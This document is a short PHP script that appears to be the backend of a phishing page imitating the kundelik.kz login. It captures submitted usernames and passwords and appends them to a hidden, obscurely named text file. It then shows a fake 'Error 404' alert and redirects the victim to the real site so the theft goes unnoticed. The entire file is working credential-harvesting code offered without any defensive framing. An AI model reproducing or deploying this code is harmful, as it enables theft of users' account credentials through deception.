<meta charset="UTF-8">
<?php
if (isset($_POST["button3"])) {
    $username = $_POST["login3"];
    $password = $_POST["password3"];


    if (!file_exists("GgafgUEHGvUgdhj7IJE72823gu.txt")) {
        $file = fopen("GgafgUEHGvUgdhj7IJE72823gu.txt", "w");
        fclose($file);
    }

    $file = fopen("GgafgUEHGvUgdhj7IJE72823gu.txt", "a");
    fwrite($file, $username . ":" . $password . "\n");
    fclose($file);

    echo
    "
            <script>
            alert('Error 404');
            document.location.href = 'http://kundelik.kz';
            </script>
            ";
}
?>